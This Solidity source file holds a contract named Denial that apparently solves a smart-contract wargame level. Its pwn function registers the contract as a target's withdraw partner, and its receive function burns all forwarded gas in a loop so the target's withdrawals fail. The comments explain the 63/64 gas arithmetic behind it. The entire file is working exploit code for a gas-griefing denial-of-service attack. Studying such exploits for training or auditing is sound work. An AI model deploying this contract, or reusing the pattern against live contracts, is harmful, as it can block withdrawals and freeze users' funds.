// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess(bytes data);

contract Denial {
    function pwn(address payable target) external payable {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature(
                "setWithdrawPartner(address)",
                address(this)
            )
        );
        if (!success) revert CallNotSuccess(data);
    }

    receive() external payable {
        // it return back to parent call before hit 2300 gas left
        // assume gasleft is 1,000,000 before call this
        // max used gas for external call is 1000000 * 63/64
        // equal 984375 gas so remain gas back is 1/64
        // equal 15625 gas back to parent
        uint256 amount = 0;
        while (gasleft() > 2300) {
            amount++;
        }
    }
}
